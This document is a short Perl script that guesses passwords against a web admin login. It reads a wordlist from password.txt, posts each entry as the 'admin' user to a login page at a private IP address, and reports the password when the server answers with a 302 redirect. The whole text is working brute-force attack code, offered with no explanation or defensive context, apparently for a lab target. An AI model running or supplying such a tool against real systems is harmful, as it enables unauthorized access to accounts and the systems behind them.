#!/usr/bin/perl
use LWP::UserAgent;

$fc = "302";
$ua = LWP::UserAgent->new();
open in, "<password.txt" or die $!;

foreach $line (<in>) {
    chomp($line);
    $post = [
        "username" => "admin", 
        "password" => $line,
        "loginsubmit" => "Submit"
    ];
    $rp = $ua->post("http://192.168.1.4/admin/login.php", $post);
    if ($rp->status_line =~ /$fc/) {
        print "$fc returned, password is '$line'.\n";
        last;
    }
}

close in;